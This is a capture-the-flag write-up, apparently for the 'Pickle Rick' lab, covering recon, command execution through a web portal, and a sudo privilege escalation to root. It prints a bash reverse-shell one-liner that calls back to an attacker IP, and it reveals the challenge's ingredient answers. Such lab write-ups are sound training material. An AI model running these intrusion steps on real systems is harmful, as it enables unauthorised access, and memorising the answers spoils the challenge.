# Pickle Rick

+ What is the first ingredient that Rick needs?`mr. meeseek hair`
+ What is the second ingredient in Rick’s potion?
+ What is the last and final ingredient?

### RECON
- Using nmap to scan open port `nmap -sC -sV -sT 10.10.147.153 > nmap_log`
- Using inspect element 
    ```html
    <!--
        Note to self, remember username!
        Username: R1ckRul3s
    -->
    ```
- Checking `robots.txt` return `Wubbalubbadubdub`
- Using Go buster found
    ```bash
    /.php                 (Status: 403) [Size: 292]
    /index.html           (Status: 200) [Size: 1062]
    /.html                (Status: 403) [Size: 293]
    /login.php            (Status: 200) [Size: 882]
    /assets               (Status: 301) [Size: 315] [--> http://10.10.147.153/assets/]
    /portal.php           (Status: 302) [Size: 0] [--> /login.php]
    ```

### EXPLOIT
- Using url `http://10.10.147.153/portal.php` we can run command
- `ls` command return 
    ```
    total 40
    drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
    drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
    -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
    drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
    -rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
    -rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
    -rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
    -rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
    -rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
    -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
    ```
- Using command `grep "" *.txt`
    ```
    Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
    clue.txt:Look around the file system for the other ingredient.
    robots.txt:Wubbalubbadubdub
    ```
- Using Bash RevShell `/bin/bash -c "bash -i >& /dev/tcp/10.4.37.160/1337 0>&1"` listen to port 1337 to get reverse shell
- Search home folder
    ```bash
    www-data@ip-10-10-147-153:/home/rick$ cat second\ ingredients 
    1 jerry tear
    ```

### PRIVILEDGE ESCALATION
- Upload `linpeas.sh` to `/dev/shm`
    ```bash
    ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
    ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
    Matching Defaults entries for www-data on ip-10-10-147-153.eu-west-1.compute.internal:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on ip-10-10-147-153.eu-west-1.compute.internal:
        (ALL) NOPASSWD: ALL

    www-data@ip-10-10-147-153:/dev/shm$ sudo su
    root@ip-10-10-147-153:/dev/shm# cd /root
    root@ip-10-10-147-153:~# ls
    3rd.txt  snap
    root@ip-10-10-147-153:~# cat 3rd.txt 
    3rd ingredients: fleeb juice
    ```